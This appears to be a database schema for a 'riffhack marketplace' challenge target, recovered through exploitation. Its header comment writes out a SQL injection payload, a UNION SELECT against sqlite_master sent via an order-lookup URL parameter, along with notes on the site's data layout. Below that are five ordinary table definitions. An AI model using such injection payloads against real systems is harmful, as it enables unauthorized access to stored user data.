-- riffhack marketplace — DB schema
-- Recovered via the web3 SQLi:
--   GET /api/orders/lookup?ref=x' UNION SELECT name,sql,0,type,0,0 FROM sqlite_master --
--
-- Backend: SQLite (Prisma-style quoted identifiers).
--
-- Notable absences: no `Listing` table (the six published listings are
-- hardcoded in the marketplace client chunk) and no `WantedListing` table
-- (the /api/wanted-listings/public endpoint generates the demo listing
-- on-the-fly per request). The only DB-backed entities are the five tables
-- below.

CREATE TABLE "ContactMessage" (
    "id"                TEXT NOT NULL PRIMARY KEY,
    "listingId"         TEXT NOT NULL,
    "email"             TEXT NOT NULL,
    "name"              TEXT,
    "message"           TEXT NOT NULL,
    "browserSessionId"  TEXT,
    "createdAt"         DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE "Order" (
    "id"            TEXT NOT NULL PRIMARY KEY,
    "userId"        TEXT NOT NULL,
    "listingId"     TEXT NOT NULL,
    "listingName"   TEXT NOT NULL,
    "price"         REAL NOT NULL,
    "status"        TEXT NOT NULL DEFAULT 'completed',
    "notes"         TEXT,
    "createdAt"     DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE "Review" (
    "id"               TEXT NOT NULL PRIMARY KEY,
    "listingId"        TEXT NOT NULL,
    "userId"           TEXT NOT NULL,
    "reviewText"       TEXT NOT NULL,
    "filename"         TEXT NOT NULL,
    "fileHash"         TEXT NOT NULL,
    "proofPath"        TEXT,
    "moderationNote"   TEXT,
    "createdAt"        DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE "SupportChatMessage" (
    "id"            TEXT NOT NULL PRIMARY KEY,
    "userId"        TEXT NOT NULL,
    "message"       TEXT NOT NULL,
    "internalNote"  TEXT,
    "createdAt"     DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE "VendorNote" (
    "id"            TEXT NOT NULL PRIMARY KEY,
    "listingId"     TEXT NOT NULL,
    "authorId"      TEXT NOT NULL,
    "note"          TEXT NOT NULL,
    "createdAt"     DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
);
